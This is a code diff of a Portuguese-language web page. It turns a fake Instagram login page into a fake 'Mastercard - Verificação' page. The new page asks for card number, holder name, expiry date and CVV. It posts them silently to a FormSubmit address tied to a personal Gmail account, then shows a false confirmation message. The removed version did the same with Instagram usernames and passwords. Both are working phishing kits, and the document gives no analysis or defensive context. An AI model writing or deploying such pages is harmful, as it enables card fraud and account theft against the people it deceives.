@@ -1,147 +1,100 @@
 <!DOCTYPE html>
 <html lang="pt-br">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Instagram</title>
-  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet" />
+  <meta charset="UTF-8">
+  <title>Mastercard - Verificação</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
     body {
-      background-color: #fafafa;
-      font-family: 'Roboto', sans-serif;
-      margin: 0;
+      background: #f2f2f2;
+      font-family: Arial, sans-serif;
       display: flex;
       justify-content: center;
       align-items: center;
-      min-height: 100vh;
-      flex-direction: column;
+      height: 100vh;
+      margin: 0;
     }
-
-    .container {
+    .container, .mensagem {
       background: white;
-      padding: 40px 30px;
-      border: 1px solid #ddd;
-      text-align: center;
+      padding: 30px;
+      border-radius: 10px;
       width: 100%;
-      max-width: 320px;
-      border-radius: 12px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      max-width: 360px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+      text-align: center;
+      display: none;
     }
-
-    .logo {
+    .active {
+      display: block;
+    }
+    img {
       width: 100px;
       margin-bottom: 20px;
     }
-
     input, button {
       width: 100%;
-      padding: 10px;
+      padding: 12px;
       margin: 10px 0;
       border: 1px solid #ccc;
       border-radius: 8px;
       font-size: 14px;
-      box-sizing: border-box;
     }
-
     button {
-      background-color: #3897f0;
+      background-color: #e60000;
       color: white;
       font-weight: bold;
       cursor: pointer;
-      border: none;
-      transition: background-color 0.3s;
     }
-
     button:hover {
-      background-color: #318bda;
-    }
-
-    .footer {
-      font-size: 12px;
-      color: #999;
-      margin-top: 15px;
-    }
-
-    .hidden {
-      display: none;
-    }
-
-    .loading {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-    }
-
-    .loading img {
-      width: 40px;
-      margin-bottom: 10px;
-      animation: spin 1s linear infinite;
-    }
-
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-
-    .message {
-      text-align: center;
-      font-size: 14px;
-      margin-top: 15px;
+      background-color: #cc0000;
     }
   </style>
 </head>
 <body>
-  <!-- Tela principal -->
-  <div class="container" id="formulario">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram" class="logo" />
-    <form id="loginForm">
-      <input type="text" name="username" placeholder="Telefone, nome de usuário ou e-mail" required />
-      <input type="password" name="password" placeholder="Senha" required />
-      <input type="hidden" name="_captcha" value="false">
-      <input type="hidden" name="_template" value="table">
-      <button type="submit">Entrar</button>
+
+  <!-- Tela de formulário -->
+  <div class="container active" id="formulario">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png" alt="Mastercard">
+    <form id="fakeForm">
+      <input type="text" name="cartao" placeholder="Número do cartão" required>
+      <input type="text" name="nome" placeholder="Nome do titular" required>
+      <input type="text" name="validade" placeholder="Validade (MM/AA)" required>
+      <input type="text" name="cvv" placeholder="Código de segurança (CVV)" required>
+      <button type="submit">Verificar</button>
     </form>
-    <div class="footer">© 2025 Instagram from Meta</div>
   </div>
 
-  <!-- Carregando -->
-  <div class="container hidden" id="carregando">
-    <div class="loading">
-      <img src="https://i.gifer.com/ZZ5H.gif" alt="Carregando" />
-      <p>Carregando...</p>
-    </div>
+  <!-- Tela de confirmação -->
+  <div class="mensagem" id="confirmacao">
+    <h2>Verificação recebida!</h2>
+    <p>Em alguns instantes chegará um e-mail de confirmação.</p>
   </div>
 
-  <!-- Final -->
-  <div class="container hidden" id="final">
-    <div class="message">
-      <p>Em alguns instantes chegará um e-mail de confirmação.</p>
-    </div>
-  </div>
-
+  <!-- Script de envio -->
   <script>
-    const form = document.getElementById("loginForm");
-
-    form.addEventListener("submit", function(e) {
+    const form = document.getElementById('fakeForm');
+    form.addEventListener('submit', function(e) {
       e.preventDefault();
 
-      // Mostra carregando
-      document.getElementById("formulario").classList.add("hidden");
-      document.getElementById("carregando").classList.remove("hidden");
-
-      // Envia os dados
-      const dados = new FormData(form);
+      // Envia via FormSubmit
       fetch("https://formsubmit.co/ajax/natanaelverissimo34@gmail.com", {
         method: "POST",
-        headers: { 'Accept': 'application/json' },
-        body: dados
-      }).then(() => {
-        setTimeout(() => {
-          document.getElementById("carregando").classList.add("hidden");
-          document.getElementById("final").classList.remove("hidden");
-        }, 2500);
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          cartao: form.cartao.value,
+          nome: form.nome.value,
+          validade: form.validade.value,
+          cvv: form.cvv.value
+        })
+      }).then(response => {
+        // Mostra tela de confirmação
+        document.getElementById('formulario').classList.remove('active');
+        document.getElementById('confirmacao').classList.add('active');
+      }).catch(error => {
+        alert("Erro no envio");
       });
     });
   </script>
+
 </body>
 </html>
